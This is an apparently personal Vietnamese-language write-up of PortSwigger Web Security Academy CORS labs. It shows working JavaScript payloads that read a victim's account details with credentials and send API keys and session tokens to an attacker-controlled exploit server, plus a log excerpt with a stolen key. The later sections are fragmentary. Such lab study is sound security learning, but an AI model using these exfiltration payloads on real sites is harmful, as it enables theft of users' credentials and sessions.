# 1. CORS vulnerability with basic origin reflection
Ta thấy khi gửi request `GET /accountDetails`, trong response sẽ chứa thông tin đầy đủ về user trong phiên hiện tại. Như vậy ta vào exploit server và cấu hình đoạn code sau:

```
<script>
let xhr = new XMLHttpRequest();
xhr.onload = sendRequest;
xhr.open('GET', 'https://0a9f008704a74bedc06f45ff00f600cd.web-security-academy.net/accountDetails');
xhr.withCredentials = true;
xhr.send();

function sendRequest(){
fetch('https://exploit-0ab7003c04f14b63c07644d50138000b.exploit-server.net/exploit?apiKey='+this.responseText);
}
</script>
```
Đoạn script trên sẽ gửi request đến `/accountDetails`, lấy ra response rồi đặt làm tham số trong request gửi tới exploit server mà ta kiểm soát.

Sau khi click "Deliver to victim", vào Access log ta thấy có một request với tham số apiKey là một object:

![image](https://user-images.githubusercontent.com/103978452/210699785-c2fc9ed4-50fa-4d0c-82cd-3424d39d6f3b.png)

Thực hiện URL decode, rồi lấy giá trị của trường "apikey" để submit, kết quả thành công.

# 2. CORS vulnerability with trusted null origin
Nhận thấy trong request `/accountDetails`, khi đặt `Origin: null` thì response trả về chứa header `Access-Control-Allow-Origin: null`. Như vậy ta có thể exploit bằng cách dùng tag iframe để tự động thiết lập `Origin: null`.

Vào exploi server và cấu hình đoạn code sau:
```
<iframe src="data:text/html,<script>let xhr = new XMLHttpRequest();
xhr.onload = sendRequest;
xhr.open('GET', 'https://0a47008204d3fe7bc0c6c26e00f2002c.web-security-academy.net/accountDetails');
xhr.withCredentials = true;
xhr.send();

function sendRequest(){
document.location='https://exploit-0a400044046dfe6ec0d3c132019600e6.exploit-server.net/?data='+this.responseText;
}
</script>">
```

Do thẻ iframe có thuộc tính `src="data:text/html,....`, Origin sẽ tự động được thiết lập là null và từ đó có thể bypass CORS. Sau khi click "Deliver to victim", vào trong Access log thì ta thấy có request:
```
10.0.4.254      2023-01-06 08:51:25 +0000 "GET /?data={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22n2daOK1lnvFCmG9DwadLa7iTt1vZieUi%22,%20%20%22sessions%22:%20[%20%20%20%20%22OZnSVCGK2EuB1QXu7RplVCP9Osicu5Gg%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
```

Tiến hành URL decode, ta thu được `apikey=n2daOK1lnvFCmG9DwadLa7iTt1vZieUi`. Submit thông tin có được, kết quả thành công.

# 3. CORS vulnerability with trusted insecure protocols

%3Cscript%3Elet%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%20%3D%20printResponse%3Bxhr.open%28%27GET%27%2C%20%27https%3A%2F%2F0af4007804f8391dc0d57751008800c4.web-security-academy.net%2FaccountDetails%27%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3Bfunction%20printResponse%28%29%7B%20%20%20%20document.location%20%3D%20%27https%3A%2F%2Fexploit-0a9a005e04143974c0e176c101cf0087.exploit-server.net%2F%3Fkey%3D%27%2BencodeURIComponent%28this.responseText%29%3B%7D%3C%2Fscript%3E

# 4. CORS vulnerability with internal network pivot attackCORS vulnerability with internal network pivot attack
